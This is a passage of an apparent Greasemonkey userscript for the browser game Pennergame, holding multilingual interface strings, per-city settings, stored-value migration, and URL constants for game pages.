    TxtNoGangAbility[6] = "способности банды тебе не приносят пользу";
    TxtNoGangAbility[7] = "You don't benefit";
var TxtIncrease = new Array();
    TxtIncrease[0] = 'Erhöht';
    TxtIncrease[1] = 'Increases';
    TxtIncrease[2] = 'Wzrost';
    TxtIncrease[3] = 'Increases';
    TxtIncrease[4] = 'Aumenta';
    TxtIncrease[5] = 'Increases';   // !!!!
    TxtIncrease[6] = 'шает';
    TxtIncrease[7] = 'Increases';
var TxtIncrATT = new Array();
    TxtIncrATT[0] = 'Angriff';
    TxtIncrATT[1] = 'attack';
    TxtIncrATT[2] = 'atak';
    TxtIncrATT[3] = 'ataque';
    TxtIncrATT[4] = 'ataque';
    TxtIncrATT[5] = 'attack';   // !!!!
    TxtIncrATT[6] = 'Атаку';
    TxtIncrATT[7] = 'attack';
var TxtIncrDEF = new Array();
    TxtIncrDEF[0] = 'Verteidigung';
    TxtIncrDEF[1] = 'defense';
    TxtIncrDEF[2] = 'obrona';
    TxtIncrDEF[3] = 'défense';
    TxtIncrDEF[4] = 'defensa';
    TxtIncrDEF[5] = 'defense';   // !!!!
    TxtIncrDEF[6] = 'Дефенз';
    TxtIncrDEF[7] = 'defense';
var TxtSicher = new Array();
    TxtSicher[0] = 'Sicher';
    TxtSicher[1] = 'Avoid';
    TxtSicher[2] = 'Uniknąć';
    TxtSicher[3] = 'certaine';
    TxtSicher[4] = ', seguro';
    TxtSicher[5] = 'Avoid';      // !!!!
    TxtSicher[6] = 'Надежно';
    TxtSicher[7] = 'Avoid!';      // !!!!
var TxtAusweich = new Array();
    TxtAusweich[0] = 'Ausweichen';
    TxtAusweich[1] = 'Defense';
    TxtAusweich[2] = 'Unikaj';
    TxtAusweich[3] = 'Esquiver';
    TxtAusweich[4] = 'Evitar';
    TxtAusweich[5] = 'Defense';   // !!!!
    TxtAusweich[6] = 'уклониться';
    TxtAusweich[7] = 'Avoid';
var TxtSkillATT = new Array();
    TxtSkillATT[0] = 'Angriff';
    TxtSkillATT[1] = 'Attack';
    TxtSkillATT[2] = 'Atak';
    TxtSkillATT[3] = 'Attaque';
    TxtSkillATT[4] = 'Ataque';
    TxtSkillATT[5] = 'Ataque';
    TxtSkillATT[6] = 'Нападение';
    TxtSkillATT[7] = 'Attack';
var TxtSkillDEF = new Array();
    TxtSkillDEF[0] = 'Verteidigung';
    TxtSkillDEF[1] = 'Defense';
    TxtSkillDEF[2] = 'Obrona';
    TxtSkillDEF[3] = 'Défense';
    TxtSkillDEF[4] = 'Defensa';
    TxtSkillDEF[5] = 'Defesa';
    TxtSkillDEF[6] = 'Оборона';
    TxtSkillDEF[7] = 'Defense';
var TxtSkillDEX = new Array();
    TxtSkillDEX[0] = 'Geschicklichkeit';
    TxtSkillDEX[1] = 'Dexterity';
    TxtSkillDEX[2] = 'Zręczność';
    TxtSkillDEX[3] = 'Habileté';
    TxtSkillDEX[4] = 'Destreza';
    TxtSkillDEX[5] = 'Agilidade';
    TxtSkillDEX[6] = 'Мастерство';
    TxtSkillDEX[7] = 'Dexterity';
var TxtLang = new Array();
    TxtLang[0] = "Sprache: deutsch";
    TxtLang[1] = "Language: american";
    TxtLang[2] = "Language: polish";
    TxtLang[3] = "Langue: français";
    TxtLang[4] = "Lengua: español";
    TxtLang[5] = "Lingua: português";
    TxtLang[6] = "язык: русский";
    TxtLang[7] = "Language: english";
var Txtmax = new Array();
    Txtmax[0] = 'max.';
    Txtmax[1] = 'max.';
    Txtmax[2] = 'max.';
    Txtmax[3] = 'max.';
    Txtmax[4] = 'max.';
    Txtmax[5] = 'max.';
    Txtmax[6] = 'max.';
    Txtmax[7] = 'max.';
var TxtReload = new Array();
    TxtReload[0] = 'Fertig!! Seiten wird in %d Sekunden neu geladen!';
    TxtReload[1] = 'Done!! Page will reload in %d seconds!';
    TxtReload[2] = 'Done!! Page will reload in %d seconds!';
    TxtReload[3] = 'Done!! Page will reload in %d seconds!';
    TxtReload[4] = 'Done!! Page will reload in %d seconds!';
    TxtReload[5] = 'Done!! Page will reload in %d seconds!';
    TxtReload[6] = 'Done!! Page will reload in %d seconds!';
    TxtReload[7] = 'Done!! Page will reload in %d seconds!';
var TxtBuyTickets = new Array();
    TxtBuyTickets[0] = 'Es werden noch %d Lose gekauft!';
    TxtBuyTickets[1] = 'Another %d tickets will be bought!';
    TxtBuyTickets[2] = 'Another %d tickets will be bought!';
    TxtBuyTickets[3] = 'Another %d tickets will be bought!';
    TxtBuyTickets[4] = 'Another %d tickets will be bought!';
    TxtBuyTickets[5] = 'Another %d tickets will be bought!';
    TxtBuyTickets[6] = 'Another %d tickets will be bought!';
    TxtBuyTickets[7] = 'Another %d tickets will be bought!';
var TxtBuyLastDefWpn = new Array();
    TxtBuyLastDefWpn[0] = 'letzte V-Waffe automatisch kaufen';
    TxtBuyLastDefWpn[1] = 'buy last DEF-weapon automatically';
var TxtRmdDefWpn = new Array();
    TxtRmdDefWpn[0] = 'an fehlende V-Waffe erinnern (max.)';
    TxtRmdDefWpn[1] = 'remind of missing DEF-weapon (max.)';
var TxtBuyDefWpn = new Array();
    TxtBuyDefWpn[0] = 'jetzt V-Waffe %s für %m kaufen ?';
    TxtBuyDefWpn[1] = 'buy DEF-weapon %s for %m now ?';
var TxtNoConfirm = new Array();
    TxtNoConfirm[0] = 'ohne Nachfrage kaufen';
    TxtNoConfirm[1] = 'buy without confirmation';
var TxtNoDefWeapon = new Array();
    TxtNoDefWeapon[0] = 'ACHTUNG!! Zur Zeit ist keine V-Waffe aktiv !!';
    TxtNoDefWeapon[1] = 'ATTENTION!! At the moment there is no DEF-weapon active !!';
var TxtDefWpnNoMny = new Array();
    TxtDefWpnNoMny[0] = 'ACHTUNG!! Die V-Waffe kostet %m, Du hast aber nur %m. Kauf nicht möglich !!';
    TxtDefWpnNoMny[1] = 'ATTENTION!! You need %m in order to buy the DEF-weapon, but you only have %m. Weapon cannot be bought !!';
var TxtDeactKKMsg = new Array();
    TxtDeactKKMsg[0] = 'Kronkorkennachrichten automatisch deaktivieren und entfernen';
    TxtDeactKKMsg[1] = 'automatically deactivate and remove messages for crowncaps';

var KEYWORD_INGANG = new Array();
    KEYWORD_INGANG[0] = 'Du bist in keiner Pennerbande';
    KEYWORD_INGANG[1] = 'You are not in a Gang';
    KEYWORD_INGANG[2] = 'Nie ma Cię w żadnej bandzie';
    KEYWORD_INGANG[3] = "Tu n'es dans aucune bande";
    KEYWORD_INGANG[4] = 'No perteneces a ninguna banda de mendigos';
    KEYWORD_INGANG[5] = 'Você não está em nenhuma gangue';
    KEYWORD_INGANG[6] = 'Ты не являешься участником никакой банды.';
    KEYWORD_INGANG[7] = "You're not in a gang";
var KEYWORD_MYBUM = new Array();
    KEYWORD_MYBUM[0] = '<strong>Mein Penner</strong>';
    KEYWORD_MYBUM[1] = '<strong>My bum</strong>';
    KEYWORD_MYBUM[2] = '<strong>Mój menel</strong>';
    KEYWORD_MYBUM[3] = '<strong>Mon clodo</strong>';
    KEYWORD_MYBUM[4] = '<strong>Mi mendigo</strong>';
    KEYWORD_MYBUM[5] = '<strong>Meu favelado</strong>';
    KEYWORD_MYBUM[6] = '<strong>Мой бомж</strong>';
    KEYWORD_MYBUM[7] = '<strong>My Bum</strong>';
var KEYWORD_JUNK = new Array();
    KEYWORD_JUNK[0] = '<h2>Aufgehobener Plunder</h2>';
    KEYWORD_JUNK[1] = '<h2>Collected Junk</h2>';
    KEYWORD_JUNK[2] = '<h2>Zatrzymane rupiecie</h2>';
    KEYWORD_JUNK[3] = '<h2>Babioles récoltées</h2>';
    KEYWORD_JUNK[4] = '<h2>Cachivache guardado</h2>';
    KEYWORD_JUNK[5] = '<h2>Treco de luxo</h2>';
    KEYWORD_JUNK[6] = '<h2>Подобранное барахло</h2>';
    KEYWORD_JUNK[7] = '<h2>Collected stuff</h2>';
var KEYWORD_GANGUPGR = new Array();
    KEYWORD_GANGUPGR[0] = 'class="tiername">Bandenbesitz';
    KEYWORD_GANGUPGR[1] = 'class="tiername">Gang possessions';
    KEYWORD_GANGUPGR[2] = 'class="tiername">Własność bandy';
    KEYWORD_GANGUPGR[3] = 'class="tiername">Biens de la bande';
    KEYWORD_GANGUPGR[4] = 'class="tiername">Propiedad de banda';
    KEYWORD_GANGUPGR[5] = 'class="tiername">Propriedade da gangue';
    KEYWORD_GANGUPGR[6] = 'class="tiername">Имущество банды';
    KEYWORD_GANGUPGR[7] = 'class="tiername">Gang property';

var idoffood = new Array();
    idoffood[0] = ID_SWEETS;
    idoffood[1] = ID_BREAD;
    idoffood[2] = ID_CURRY;
    idoffood[3] = ID_STOLLN;
    idoffood[4] = ID_DOENER;

var promillevals = new Array();
    promillevals[0]=0.15;
    promillevals[1]=0.35;
    promillevals[2]=1;
    promillevals[3]=1.5;
    promillevals[4]=2;

var missions = new Array("Casino-Besuch", "Kiez-Tour", "Straßenkampf", "Schrottplatz", "Floß im Pennerparadies");
var missDauer = new Array (10800, 86400, 86400, 10800, 86400);

var alcoplunder = new Array();
var exalcoplunder = new Array();
var alcoActionNr = new Array();
var alcoPlunderInfo = new Array();

var FoodNames = new Array();

var restPlunder = "";
var restPlunderimg;
var restActionNr = "";
var restIndex = -1;
var currency = "€";        // Euro-Zeichen
var currency1 = "";
var TZ = new Array();        // Tausender-Trennzeichen
    TZ[0] = '.';
    TZ[1] = ',';
    TZ[2] = '.';
    TZ[3] = '.';
    TZ[4] = '.';
    TZ[5] = '.';
    TZ[6] = ',';
    TZ[7] = ',';
var DZ = new Array();        // Dezimal-Trennzeichen
    DZ[0] = ',';
    DZ[1] = '.';
    DZ[2] = ',';
    DZ[3] = ',';
    DZ[4] = ',';
    DZ[5] = ',';
    DZ[6] = '.';
    DZ[7] = '.';
var DS = new Array();        // Datums-Trennzeichen
    DS[0] = '.';
    DS[1] = '/';
    DS[2] = '.';
    DS[3] = '.';
    DS[4] = '.';
    DS[5] = '.';
    DS[6] = '.';
    DS[7] = '.';
var lang = 0;
var WiWut = 0;
var WutDatum = "";
var PSWaitTime = 72000;      // Plundershop Wartezeit (20 Stunden)
var maxBoostTime = 172800;   // max. Bandenboostzeit (48 Stunden)
var PSwidth = 0;             // Breite der Plundershop-Leiste
var MAXNROFSLOTS = 9;

// Koordinaten
var PD_X;   // X-Koordinate Plunderdirektleiste
var PD_Y;   // Y-Koordinate Plunderdirektleiste
var PW_X;   // X-Koordinate Promilleleiste
var PW_Y;   // Y-Koordinate Promilleleiste
var AD_X;   // X-Koordinate ATT/DEF-Leiste
var AD_Y;   // Y-Koordinate ATT/DEF-Leiste
var GF_X;   // X-Koordinate Bandenkampf-Icon
var GF_Y;   // Y-Koordinate Bandenkampf-Icon
var FB_X;   // X-Koordinate Fight-Icon
var FB_Y;   // Y-Koordinate Fight-Icon
var PB_X;   // X-Koordinate Plunder/Wut/Power-Leiste
var PB_Y;   // Y-Koordinate Plunder/Wut/Power-Leiste
var PA_X;   // X-Koordinate Provokation/tägliche Aufgabe
var PA_Y;   // Y-Koordinate Provokation/tägliche Aufgabe
var SC_X;   // X-Koordinate Bildung/Karten/Einkaufswagen
var SC_Y;   // Y-Koordinate Bildung/Karten/Einkaufswagen
var MI_X;   // X-Koordinate Missionen
var MI_Y;   // Y-Koordinate Missionen
var koord = new Array(); // Array fuer Koordinaten

// ***********************************************************************************************
// Stadt ermitteln und Variablen entsprechend setzen
// ***********************************************************************************************
var TZDiff = 60;
var TOWNEXTOLD = "";
var language = document.getElementsByName("language")[0].content;
var metas = document.getElementsByTagName("meta");
for (i = 0; i< metas.length; i++)
    if (metas[i].getAttribute('property') == "og:url") {
        var TOWNBASE_URL = metas[i].content + "/";
        break;
    }
var noWash = false;
// Wenn in Berlin gespielt wird
if (language == "bl_DE") {
    var TOWNEXTENSION = 'B';
    FoodNames[0] = 'Halloween S&uuml;&szlig;igkeiten';
    FoodNames[1] = 'Stullen';
    FoodNames[2] = 'Curryw&uuml;rste';
    FoodNames[3] = 'Stollen';
    FoodNames[4] = 'D&ouml;ner';
    alcoplunder[0] = "Nikolaus-Plunder";
    alcoplunder[1] = "Goldenes Bier";
// Wenn in München gespielt wird
} else if (language == "mu_DE") {
    var TOWNEXTENSION = 'MU';
    FoodNames[0] = 'Halloween S&uuml;&szlig;igkeiten';
    FoodNames[1] = 'Leberkas';
    FoodNames[2] = 'Obatzter';
    FoodNames[3] = 'Stollen';
    FoodNames[4] = 'Weißwurst und a Brezn';
    alcoplunder[0] = "Nikolaus-Plunder";
    alcoplunder[1] = "Goldenes Bier";
// Wenn in Köln gespielt wird
} else if (language == "kl_DE") {
    var TOWNEXTENSION = 'K';
    FoodNames[0] = 'Halloween S&uuml;&szlig;igkeiten';
    FoodNames[1] = 'Röggelchen';
    FoodNames[2] = 'Flönz';
    FoodNames[3] = 'Stollen';
    FoodNames[4] = 'Kölner Krüstchen';
    alcoplunder[0] = "Nikolaus-Plunder";
    alcoplunder[1] = "Goldenes Bier";
// Wenn in Sylt gespielt wird
} else if (language == "sy_DE") {
    var TOWNEXTENSION = 'SY';
    FoodNames[0] = 'Halloween S&uuml;&szlig;igkeiten';
    FoodNames[1] = 'Fischbrötchen';
    FoodNames[2] = 'Krabbencocktail';
    FoodNames[3] = 'Stollen';
    FoodNames[4] = 'Kölner Krüstchen';
    alcoplunder[0] = "Nikolaus-Plunder";
    alcoplunder[1] = "Goldenes Bier";
    TxtBeer1[0] = "Flaschen Fassbrause";
    noWash = true;
// Wenn in Malle gespielt wird
} else if (location.toString().indexOf("malle") != -1) {
    var TOWNEXTENSION = 'PM';
    FoodNames[0] = 'Halloween S&uuml;&szlig;igkeiten';
    FoodNames[1] = 'Brote';
//  FoodNames[1] = 'Eis';
    FoodNames[2] = 'Curryw&uuml;rste';
//  FoodNames[2] = 'Sobrassada de Mallorca';
    FoodNames[3] = 'Stollen';
    FoodNames[4] = 'Paella';
    alcoplunder[0] = "Nikolaus-Plunder";
    alcoplunder[1] = "Goldenes Bier";
// Wenn in Halloween gespielt wird
} else if (location.toString().indexOf("halloween") != -1) {
    var TOWNEXTENSION = 'HW';
    FoodNames[0] = 'Halloween S&uuml;&szlig;igkeiten';
    FoodNames[1] = 'Brote';
    FoodNames[2] = 'Curryw&uuml;rste';
    FoodNames[3] = 'Stollen';
    FoodNames[4] = 'Kürbis';
    alcoplunder[0] = "Nikolaus-Plunder";
    alcoplunder[1] = "Goldenes Bier";
    TxtBeer1[0] = "Flaschen Blut";
// Wenn Operation Pennersturm gespielt wird
} else if (language == 's6_DE') {
    var TOWNEXTENSION = 'OP';
    FoodNames[0] = 'Halloween S&uuml;&szlig;igkeiten';
    FoodNames[1] = 'Datteln';
    FoodNames[2] = 'Couscous';
    FoodNames[3] = 'Stollen';
    FoodNames[4] = 'Kürbis';
    alcoplunder[0] = "Nikolaus-Plunder";
    alcoplunder[1] = "Goldenes Bier";
    TxtBeer1[0] = "Becher Assam Tee";
    currency = '$';
// Wenn in Hamburg gespielt wird
} else if (language == "de_DE" || language == "hr_DE") {
    var TOWNEXTENSION = 'HH';
    FoodNames[0] = 'Halloween S&uuml;&szlig;igkeiten';
    FoodNames[1] = 'Brote';
    FoodNames[2] = 'Curryw&uuml;rste';
    FoodNames[3] = 'Stollen';
    FoodNames[4] = 'Hamburger';
    alcoplunder[0] = "Nikolaus-Plunder";
    alcoplunder[1] = "Goldenes Bier";
    if (language == "hr_DE") {
        FoodNames[1] = 'Brot';
        FoodNames[2] = 'Currywurst';
        TOWNEXTOLD = TOWNEXTENSION;
        TOWNEXTENSION = 'HR';
    }
// Wenn in New York gespielt wird
} else if (language == "us_EN") {
    var TOWNEXTENSION = 'NY';
    FoodNames[0] = 'Halloween S&uuml;&szlig;igkeiten';
    FoodNames[1] = 'Bread';
    FoodNames[2] = 'Hot Dog';
    FoodNames[3] = 'Stollen';
    FoodNames[4] = 'Hamburger';
    alcoplunder[0] = "Nikolaus-Plunder";
    alcoplunder[1] = "Goldenes Bier";
    lang = 1;
    currency = '$';
// Wenn in Krakau gespielt wird
} else if (language == "kr_PL") {
    var TOWNEXTENSION = 'KR';
    FoodNames[0] = 'Halloween S&uuml;&szlig;igkeiten';
    FoodNames[1] = 'Obwarzanka';
    FoodNames[2] = 'Kebab';
    FoodNames[3] = 'Stollen';
    FoodNames[4] = 'Zapiekanka';
    alcoplunder[0] = "Nikolaus-Plunder";
    alcoplunder[1] = "Goldenes Bier";
    lang = 2;
    currency = 'zl';
// Wenn in Warschau gespielt wird
} else if (language == "pl_PL" || language == "wr_PL") {
    var TOWNEXTENSION = 'WA';
    FoodNames[0] = 'Halloween S&uuml;&szlig;igkeiten';
    FoodNames[1] = 'Chleb';
    FoodNames[2] = 'Kebab';
    FoodNames[3] = 'Stollen';
    FoodNames[4] = 'Hamburger';
    alcoplunder[0] = "Nikolaus-Plunder";
    alcoplunder[1] = "Goldenes Bier";
    if (language == "wr_PL") {
        TOWNEXTOLD = TOWNEXTENSION;
        TOWNEXTENSION = 'WR';
    }
    lang = 2;
    currency = 'zl';
// Wenn in Marseille gespielt wird
} else if (language == "ma_FR") {
    var TOWNEXTENSION = 'MS';
    FoodNames[0] = 'Halloween S&uuml;&szlig;igkeiten';
    FoodNames[1] = 'Baguette';
    FoodNames[2] = 'Crêpe';
    FoodNames[3] = 'Stollen';
    FoodNames[4] = 'Jambon-beurre';
    alcoplunder[0] = "Nikolaus-Plunder";
    alcoplunder[1] = "Biêre dorée";
    lang = 3;
// Wenn in Paris gespielt wird
} else if (language == "fr_FR" || language == "cr_FR") {
    var TOWNEXTENSION = 'PA';
    FoodNames[0] = 'Halloween S&uuml;&szlig;igkeiten';
    FoodNames[1] = 'Baguette';
    FoodNames[2] = 'Crêpe';
    FoodNames[3] = 'Stollen';
    FoodNames[4] = 'Jambon-beurre';
    alcoplunder[0] = "Nikolaus-Plunder";
    alcoplunder[1] = "Biêre dorée";
    if (language == "cr_FR") {
        TOWNEXTOLD = TOWNEXTENSION;
        TOWNEXTENSION = 'PR';
    }
    lang = 3;
// Wenn in Buenos Aires gespielt wird
} else if (language == "ba_ES") {
    var TOWNEXTENSION = 'BA';
    FoodNames[0] = 'Halloween S&uuml;&szlig;igkeiten';
    FoodNames[1] = 'alfajores';
    FoodNames[2] = 'Perrito caliente';
    FoodNames[3] = 'Stollen';
    FoodNames[4] = 'empanada';
    alcoplunder[0] = "Nikolaus-Plunder";
    alcoplunder[1] = "Cerveza dorada";
    TxtBeer1[4] = 'chatarra cerveza';
    TxtBeer2[4] = 'chatarra cerveza';
    lang = 4;
    currency = '$';
    TZDiff = -240;
// Wenn in Madrid gespielt wird
} else if (language == "es_ES" || language == "er_ES") {
    var TOWNEXTENSION = 'MD';
    FoodNames[0] = 'Halloween S&uuml;&szlig;igkeiten';
    FoodNames[1] = 'Bollo';
    FoodNames[2] = 'Perrito caliente';
    FoodNames[3] = 'Stollen';
    FoodNames[4] = 'Bocadillo de lomo';
    alcoplunder[0] = "Nikolaus-Plunder";
    alcoplunder[1] = "Cerveza dorada";
    if (language == "er_ES") {
        FoodNames[1] = 'bollos';
        TxtBeer1[4] = 'chatarra calimocho';
        TxtBeer2[4] = 'chatarra calimocho';
        TOWNEXTOLD = TOWNEXTENSION;
        TOWNEXTENSION = 'MR';
    }
    lang = 4;
// Wenn in Sao Paolo gespielt wird
} else if (language == "sp_BR") {
    var TOWNEXTENSION = 'SP';
    FoodNames[0] = 'Halloween S&uuml;&szlig;igkeiten';
    FoodNames[1] = 'Pães';
    FoodNames[2] = 'Perrito caliente';
    FoodNames[3] = 'Stollen';
    FoodNames[4] = 'Bocadillo de lomo';
    alcoplunder[0] = "Nikolaus-Plunder";
    alcoplunder[1] = "Cerveza dorada";
    lang = 5;
    currency = 'R$';
    TZDiff = -240;
// Wenn in Rio de Janeiro gespielt wird
} else if (language == "pt_BR") {
    var TOWNEXTENSION = 'RJ';
    TOWNEXTOLD = 'BA';
    FoodNames[0] = 'Halloween S&uuml;&szlig;igkeiten';
    FoodNames[1] = 'Pães';
    FoodNames[2] = 'Perrito caliente';
    FoodNames[3] = 'Stollen';
    FoodNames[4] = 'Bocadillo de lomo';
    alcoplunder[0] = "Nikolaus-Plunder";
    alcoplunder[1] = "Cerveza dorada";
    lang = 5;
    currency = 'R$';
    TZDiff = -240;
// Wenn in Moskau gespielt wird
} else if (language == "ru_RU") {
    var TOWNEXTENSION = 'MO';
    TOWNEXTOLD = 'PB';
    FoodNames[0] = 'Halloween S&uuml;&szlig;igkeiten';
    FoodNames[1] = 'Пельмешек';
    FoodNames[2] = 'Сосиски';
    FoodNames[3] = 'Stollen';
    FoodNames[4] = 'Шаурма';
    alcoplunder[0] = "Nikolaus-Plunder";
    alcoplunder[1] = "Cerveza dorada";
    lang = 6;
    currency1 = ' руб. ';
    currency2 = ' коп.';
    TZDiff = 240;
// Wenn in London gespielt wird
} else if (language == "en_EN") {
    var TOWNEXTENSION = 'LO';
    FoodNames[0] = 'Halloween S&uuml;&szlig;igkeiten';
    FoodNames[1] = 'Bread';
    FoodNames[2] = 'Bags of chips';
    FoodNames[3] = 'Stollen';
    FoodNames[4] = 'Kebab';
    alcoplunder[0] = "Nikolaus-Plunder";
    alcoplunder[1] = "Cerveza dorada";
    var lang = 7;
    currency = '£';
}

var TXLEN = TOWNEXTENSION.length;
var keys = GM_listValues();
for (i = 0; i < keys.length; i++) {
    var val = keys[i];
    if (val.substr(0,9) == "undefined" || Right$(val, 9) == "undefined" || Right$(val, 8) == "Userdata" || Right$(val, 19) == "PlunderDirectAccess" || val == "ScriptVersion" || val == "GetInfo" || val.indexOf('XmasCalendar') != -1)
        GM_deleteValue(val);
    else if (val.substr(val.length-TXLEN) == TOWNEXTENSION) {
        if (TOWNEXTENSION == "B" && (val.substr(val.length-2) == "FB" || val.substr(val.length-2) == "PB")) {
            continue;
        }
        var v = GM_getValue(TOWNEXTENSION+val.substr(0, val.length-TXLEN), "deadmeat");
        if (v == "deadmeat")
            GM_setValue(TOWNEXTENSION+val.substr(0, val.length-TXLEN), GM_getValue(val));
        GM_deleteValue(val);
    }
    else if (TOWNEXTENSION == "B" && val.substr(val.length-1) == "F") {
        var v = GM_getValue(val, "deadmeat");
        if (v != "deadmeat") {
            GM_setValue(val.substr(1)+"B", v);
            GM_deleteValue(val);
            continue;
        }
    }
}

myLang = PG_getValue("myLang", lang);   // Sprache laden
PG_setValue("myLang", myLang);          // Sprache speichern
var lockmove = PG_getValue("lockmove", 0);
var EatDrinkFeedBack = PG_getValue("EatDrinkFB", 1);
var CollEndAlert = PG_getValue("CollEndAlert", 1);
var clean = -1;
var crimePlanned = 0;
var TAisEatSnack = false;
var TAisDrink2 = false;
var scriptData = new Array();
var glblVars = new Array();
var noUpdate = false;
var attname = "";
var attid = 0;
var weaponatt = -1;
var weapondef = "";
var now = new Date();
var timeDiff = (TZDiff + (now.getTimezoneOffset() + (new Date(now.getFullYear(), 0, 1).getTimezoneOffset() != now.getTimezoneOffset()?60:0))) * 60;

var dailyTaskLinks = new Array();
    dailyTaskLinks[0] = 'friendlist/';
    dailyTaskLinks[1] = 'activities/crime/';
    dailyTaskLinks[2] = 'fight/';
    dailyTaskLinks[3] = 'city/games/';
    dailyTaskLinks[4] = 'gang/';
    dailyTaskLinks[5] = 'city/supermarket/';
    dailyTaskLinks[6] = 'fight/pet/';
    dailyTaskLinks[7] = 'city/washhouse/';
    dailyTaskLinks[8] = 'gang/credit/';
    dailyTaskLinks[9] = 'gang/stuff/';
    dailyTaskLinks[10] = 'skills/pet/';
    dailyTaskLinks[11] = 'stock/plunder/craft' + (oldVersion?'/':'list/');
    dailyTaskLinks[12] = 'stock/foodstuffs/food/';
    dailyTaskLinks[13] = 'stock/';
    dailyTaskLinks[14] = 'activities/';
    dailyTaskLinks[15] = 'stock/bottle/';
    dailyTaskLinks[16] = 'stock/plunder/';
    dailyTaskLinks[17] = 'city/district/';
    dailyTaskLinks[18] = 'stock/armoury/';
    dailyTaskLinks[19] = 'change_please/statistics/';
    dailyTaskLinks[20] = 'city/weapon_store/';

var API_URL = TOWNBASE_URL + 'dev/api/user.';
var HOME_URL = TOWNBASE_URL + 'city/home/';
var WASHHOUSE_URL = TOWNBASE_URL + 'city/washhouse/';
var MEDICINE_URL = TOWNBASE_URL + 'city/medicine/';
var WASH_URL = TOWNBASE_URL + 'city/washhouse/buy/';
var CURE_URL = TOWNBASE_URL + 'city/medicine/firstaid/';
var PLUNDERSHOP_URL = TOWNBASE_URL + 'city/plundershop/';
var WEAPONSTORE_URL = TOWNBASE_URL + 'city/weapon_store/';
var WEAPONSTOREDEF_URL = TOWNBASE_URL + 'city/weapon_store/def/';
var MINIJOBS_URL = TOWNBASE_URL + 'city/minijobs/';
var DAILY_URL = TOWNBASE_URL + 'daily/';
var REWARDS_URL = TOWNBASE_URL + 'daily/rewards/';
var FIGHT_URL = TOWNBASE_URL + 'fight/overview/';
var GANG_URL = TOWNBASE_URL + 'gang/';
var GANG_PROFILE = TOWNBASE_URL + 'profil/bande:';
var GANGFIGHT_URL = TOWNBASE_URL + 'gang/fight/';
var GANGPACT_URL = TOWNBASE_URL + 'gang/pact/';
var GANGUPGRADE_URL = TOWNBASE_URL + 'gang/upgrades/';
var MISSION_URL = TOWNBASE_URL + 'gang/missions/';
var GANGSEARCH_URL = TOWNBASE_URL + 'highscore/gang/?gang=';
var MESSAGE_URL = TOWNBASE_URL + 'messages/';
var OVERVIEW_URL = TOWNBASE_URL + 'overview/';
var WB_URL = TOWNBASE_URL + 'skills/';
var WBPET_URL = TOWNBASE_URL + 'skills/pet/';
var PET_URL = TOWNBASE_URL + 'pet/';
var DRINK_STACK = TOWNBASE_URL + 'stock/';
var WEAPON_URL = TOWNBASE_URL + 'stock/armoury/';
var EAT_URL = TOWNBASE_URL + 'stock/foodstuffs/use/';
var EAT_STACK = TOWNBASE_URL + 'stock/foodstuffs/food/';
var PLUNDER_URL = TOWNBASE_URL + 'stock/plunder/';
var NEWPLUNDER_URL = TOWNBASE_URL + 'stock/newplunder/';
var PLUNDERCHANGE_URL = TOWNBASE_URL + 'stock/plunder/change/';

function convertUni(text) {
    return text.replace(/&uuml;/g, 'ü').replace(/&ouml;/g,'ö').replace(/&szlig;/g, 'ß');
}

// **********************************************************************************
// **********************************************************************************
// Funktion initialisert das Array mit den Tagesaufgaben
// **********************************************************************************
// **********************************************************************************
function initDaily(lang) {
    var taskTexts = new Array();

    for (var i = 0; i <= 16; i++)
        taskTexts[i] = "";

    switch (lang) {
        case 0:
                taskTexts[0] = 'Jetzt eine PN an einen Freund versenden';
                taskTexts[1] = 'Ein Verbrechen erfolgreich begehen';
                taskTexts[2] = 'Einen Kampf gewinnen';
                taskTexts[3] = 'Jetzt Lose kaufen';
                taskTexts[4] = 'Jetzt in der SB posten';
                taskTexts[5] = 'Jetzt im Supermarkt Getränke kaufen.';
                taskTexts[6] = 'Jetzt einen Haustierkampf aktivieren';
                taskTexts[7] = 'Jetzt einmal 100% sauber werden';
                taskTexts[8] = 'Geld in deine Bandenkasse einzahlen';
                taskTexts[9] = 'Plunder in die Plunderbank deiner Bande einzahlen';
                taskTexts[10] = 'Eine Haustierweiterbildung starten';
                taskTexts[11] = 'Einen Plunder basteln';
                taskTexts[12] = 'Jetzt einen kleinen Snack essen';
                taskTexts[13] = 'Promillepegel über 2‰';
                taskTexts[14] = 'Einmal Flaschensammeln starten';
                taskTexts[15] = 'Jetzt Flaschen verkaufen';
                taskTexts[16] = 'Jetzt Plunder verkaufen';
                taskTexts[17] = 'Jetzt den Stadtteil wechseln.';
                if (TOWNEXTENSION == 'SY')
                    taskTexts[17] = 'Jetzt das Gebiet wechseln.';
                taskTexts[18] = 'Jetzt eine Waffe verkaufen.';
                taskTexts[19] = 'Jetzt einem anderen Penner spenden.';
                taskTexts[20] = 'Jetzt Zahnstocher kaufen.';
                if (TOWNEXTENSION == 'SY')
                    taskTexts[20] = 'Jetzt Distel kaufen.';
                break;
        case 1:
                taskTexts[0] = 'Send a Private message to a friend';
                taskTexts[1] = 'Commit a crime';
                taskTexts[2] = 'Win a fight';
                taskTexts[3] = 'Buy some Luck!';
                taskTexts[4] = 'Post something in the Shoutbox';
                taskTexts[5] = 'Purchase drinks in the supermarket';
                taskTexts[6] = 'Start a Petfight';
                taskTexts[7] = 'Become 100% clean';
                taskTexts[8] = 'Pay Money into the gang account';
                taskTexts[9] = "Deposit junk into the gang's inventory";
                taskTexts[10] = 'Start a pet development';
                taskTexts[11] = 'Tinker with your Junk';
                taskTexts[12] = 'Eat a small snack';
                taskTexts[13] = 'BAC over 3%';
                taskTexts[14] = 'Start collecting bottles';
                taskTexts[15] = 'Sell some bottles';
                taskTexts[16] = 'Sell some junk';
                taskTexts[17] = 'Jetzt den Stadtteil wechseln.';
                taskTexts[18] = 'Jetzt eine Waffe verkaufen.';
                taskTexts[19] = 'Jetzt einem anderen Penner spenden.';
                taskTexts[20] = 'Jetzt Zahnstocher kaufen.';
                break;
        case 2:
                taskTexts[0] = 'Napisz do kumpla';
                taskTexts[1] = 'Popełnij przestępstwo';
                taskTexts[2] = 'Wygraj walkę';
                taskTexts[3] = 'Kup zdrapki';
                taskTexts[4] = 'Napisz coś w shoutbox.';
                taskTexts[5] = 'Odwiedź monopolowy.';
                taskTexts[6] = 'Rozpocznij walkę zwierzaków.';
                taskTexts[7] = 'Wykąp się!';
                taskTexts[8] = 'Wpłać pieniądze na konto bandy';
                taskTexts[9] = 'Przekaż rupiecie do kasy rupieci twojej bandy';
                taskTexts[10] = 'Rozpocznij szkolenie zwierzaka';
                taskTexts[11] = 'Majsterkuj rupieć';
                taskTexts[12] = 'Przekąsić małe co nieco.';
                taskTexts[13] = 'Poziom promili 2‰';
                taskTexts[14] = 'Zacznij zbierać puszki';
